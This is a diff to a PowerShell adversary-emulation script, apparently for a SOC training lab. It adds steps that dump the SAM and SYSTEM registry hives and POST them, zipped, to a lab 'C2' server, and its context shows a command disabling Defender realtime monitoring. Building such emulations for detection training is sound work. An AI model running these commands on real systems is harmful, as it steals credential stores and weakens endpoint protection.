@@ -94,10 +94,26 @@ Start-Sleep 2
 # =========================================================================
 Say "[16:10] WINDOW C - cred theft + ransomware behavior (sandbox only)"
 
-# 1) SAM/SYSTEM hive export (T1003.002) - cmdline is the alert; files removed
+# 1) SAM/SYSTEM hive export (T1003.002)
 reg.exe save HKLM\SAM    "$Sandbox\sam.hive"    /y 2>$null | Out-Null
 reg.exe save HKLM\SYSTEM "$Sandbox\system.hive" /y 2>$null | Out-Null
-Remove-Item "$Sandbox\*.hive" -Force -ErrorAction SilentlyContinue
+
+# 1b) Exfiltrate the hives to the "C2" (really SOC-CORE01, so the dump
+#     actually lands in the SOC lab for the class to examine) - T1041
+#     Requires exfil-receiver.py running on SOC-CORE01:8888 (see README).
+$C2 = "http://10.10.20.10:8888/upload"
+$zip = "$Sandbox\hives.zip"
+Compress-Archive -Path "$Sandbox\sam.hive","$Sandbox\system.hive" -DestinationPath $zip -Force
+try {
+  $bytes = [IO.File]::ReadAllBytes($zip)
+  Invoke-WebRequest -Uri $C2 -Method POST -Body $bytes `
+    -Headers @{ "X-Filename" = "WIN-VICTIM01_hives.zip" } `
+    -ContentType "application/octet-stream" -TimeoutSec 5 -UseBasicParsing | Out-Null
+  Say "  hives exfiltrated to $C2"
+} catch {
+  Say "  exfil attempt failed (is exfil-receiver.py running on SOC-CORE01?) - $($_.Exception.Message)"
+}
+Remove-Item "$Sandbox\*.hive","$zip" -Force -ErrorAction SilentlyContinue
 
 # 2) Disable Defender realtime (T1562.001) - command line is the alert
 try { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop; Start-Sleep 3;
